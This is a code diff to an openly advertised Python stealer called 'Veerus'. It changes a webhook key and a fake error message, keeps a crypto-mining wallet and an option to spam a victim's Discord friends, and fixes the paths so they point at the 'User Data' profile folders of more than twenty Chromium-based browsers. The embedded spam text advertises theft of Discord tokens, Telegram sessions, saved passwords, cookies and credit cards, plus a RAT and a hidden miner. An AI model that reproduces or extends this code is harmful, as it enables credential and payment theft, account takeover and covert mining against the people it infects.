@@ -27,6 +27,7 @@ from Crypto.Cipher import AES
 from json import loads
 from regex import findall
 import platform
+from tkinter import messagebox
 from http.server import BaseHTTPRequestHandler, HTTPServer
 import time
 import codecs
@@ -43,7 +44,7 @@ import pyImpossibleObf
 """
 
 #WaiBook = "it|qt;00ejtdpse/dpn/aqi7xfcipplt0211:7:36616?885779:0heqLJxXlfzKs>IRZW:SUtX`s8`zexQmPL\zybLym1M:`segvEorePSAhMMv12n[{qc`J"
-chiffre = "webhook667"
+chiffre = "dazdzadza"
 ADDRESS = "TRX:TT9CxzPs846UQ2F5zxwmPuqHV115ETvs4d" #Only RandomX, replace with your adress COIN:ADDR ex : XMR:42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq please donate lmao
 
 
@@ -56,7 +57,7 @@ FAKERRMSG = "Exception at thread 0xSxZ3b78"
 MINE = True #Mine crypto? True/False
 
 DMALL_FRIENDS = False #Dm all friends in discord using token.
-DMALL_MSG = ":flag_gb: :\nFÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â»cked by the best virus ever\n\nDiscord grabber\nTelegram session grabber\nChrome/Firefox Cr4d1t c4rds, cookies, autofill, password stealer\nUndetected\nRAT\nHidden Crypto Miner\n\n\nLink : https://github.com/0xSxZ/Veerus \n\nBy 0xSz/0xSxZ" #Leave like that if you want to support the project.
+DMALL_MSG = ":flag_gb: :\nFÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â»cked by the best virus ever\n\nDiscord grabber\nTelegram session grabber\nChrome/Firefox Cr4d1t c4rds, cookies, autofill, password stealer\nUndetected\nRAT\nHidden Crypto Miner\n\n\nLink : https://github.com/0xSxZ/Veerus \n\nBy 0xSz/0xSxZ" #Leave like that if you want to support the project.
 
 
 APP_DATA_PATH= os.environ['LOCALAPPDATA']
@@ -73,29 +74,29 @@ default_appdata = os.getenv('APPDATA')
 chromiumpaths = [
 	default_appdata + "\\Opera Software\\Opera Stable",
 	default_appdata + "\\Opera Software\\Opera GX Stable",
-	local_appdata + "Google\\Chrome",
-	local_appdata + "Google(x86)\\Chrome",
-	local_appdata + "Chromium",
-	local_appdata + "BraveSoftware\\Brave-Browser",
-	local_appdata + "Epic Privacy Browser",
-	local_appdata + "Amigo",
-	local_appdata + "Vivaldi",
-	local_appdata + "Orbitum",
-	local_appdata + "Mail.Ru\\Atom",
-	local_appdata + "Kometa",
-	local_appdata + "Comodo\\Dragon",
-	local_appdata + "Torch",
-	local_appdata + "Comodo",
-	local_appdata + "Slimjet",
-	local_appdata + "360Browser\\Browser",
-	local_appdata + "Maxthon3",
-	local_appdata + "K-Melon",
-	local_appdata + "Sputnik\\Sputnik",
-	local_appdata + "Nichrome",
-	local_appdata + "CocCoc\\Browser",
-	local_appdata + "uCozMedia\\Uran",
-	local_appdata + "Chromodo",
-	local_appdata + "Yandex\\YandexBrowser"
+	local_appdata + "Google\\Chrome\\User Data",
+	local_appdata + "Google(x86)\\Chrome\\User Data",
+	local_appdata + "Chromium\\User Data",
+	local_appdata + "BraveSoftware\\Brave-Browser\\User Data",
+	local_appdata + "Epic Privacy Browser\\User Data",
+	local_appdata + "Amigo\\User Data",
+	local_appdata + "Vivaldi\\User Data",
+	local_appdata + "Orbitum\\User Data",
+	local_appdata + "Mail.Ru\\Atom\\User Data",
+	local_appdata + "Kometa\\User Data",
+	local_appdata + "Comodo\\Dragon\\User Data",
+	local_appdata + "Torch\\User Data",
+	local_appdata + "Comodo\\User Data",
+	local_appdata + "Slimjet\\User Data",
+	local_appdata + "360Browser\\Browser\\User Data",
+	local_appdata + "Maxthon3\\User Data",
+	local_appdata + "K-Melon\\User Data",
+	local_appdata + "Sputnik\\Sputnik\\User Data",
+	local_appdata + "Nichrome\\User Data",
+	local_appdata + "CocCoc\\Browser\\User Data",
+	local_appdata + "uCozMedia\\Uran\\User Data",
+	local_appdata + "Chromodo\\User Data",
+	local_appdata + "Yandex\\YandexBrowser\\User Data"
 ]
 
 yes = "yes"
